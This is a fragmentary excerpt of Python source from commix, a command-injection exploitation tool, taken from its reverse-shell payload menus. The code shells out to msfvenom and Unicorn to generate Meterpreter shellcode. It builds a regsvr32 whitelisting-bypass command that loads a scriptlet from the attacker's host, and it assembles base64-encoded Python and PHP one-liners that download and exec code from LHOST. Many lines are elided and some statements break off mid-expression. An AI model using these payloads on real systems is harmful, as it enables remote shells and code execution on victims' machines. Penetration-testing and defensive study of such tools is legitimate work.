...
def set_php_working_dir():
    while True:
        if not menu.options.batch:
            ...
            php_dir = input(settings.print_question_msg(question_msg))
        else:
            php_dir = ""
        if len(php_dir) == 0:
            php_dir = "Y"
        if php_dir in settings.CHOICE_YES:
            ...
            settings.WIN_PHP_DIR = input(settings.print_question_msg(question_msg))
...
\ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
    ...
    while True:
        if not menu.options.batch:
            ...
            enable_bin_dir = input(settings.print_question_msg(question_msg))
        else:
            enable_bin_dir = ""
...
\ncommix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
                    ...
                    if windows_reverse_shell == '1':
                        ...
                        try:
                            proc = subprocess.Popen(
                                "msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(
                                    settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
                            with open(output, 'r') as content_file:
                                repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x',
                                         'unsignedcharbuf[]=': ''}
                                shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()),
                        ...
                        try:
                            ...
                            try:
                                unicorn_path = os.path.abspath(
                                    os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                                ...
                                with open('unicorn.py') as unicorn_file:
                                    for line in unicorn_file:
                                        ...
                                        if "Magic Unicorn Attack Vector v" in line:
                                            unicorn_version = line.replace("Magic Unicorn Attack Vector v", "").replace(
                            ...
                            try:
                                ...
                                gen_payload_msg(payload)
                                subprocess.Popen(
                                    "python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(
                                        settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                                with open(output, 'r') as content_file:
                    ...
                    # Regsvr32.exe application whitelisting bypass
                        ...
                        if not settings.TARGET_OS == "win":
                            ...
                            other_shell = "regsvr32 /s /n /u /i:http://" + str(settings.LHOST) + ":" + str(
                                settings.SRVPORT) + settings.URIPATH + ".sct scrobj.dll"
                            msf_launch_msg(output)
                            break
            break
...
\ncommix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
                ...
                if 'payload' in locals():
                    ...
                    if web_delivery == '1':
                        data = "; r=_urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(
                            settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
                        data = base64.b64encode(data)
                        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR:
                            set_python_working_dir()
                            other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
                        ...
                        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
                            ...
                            other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(
                                settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
                        else:
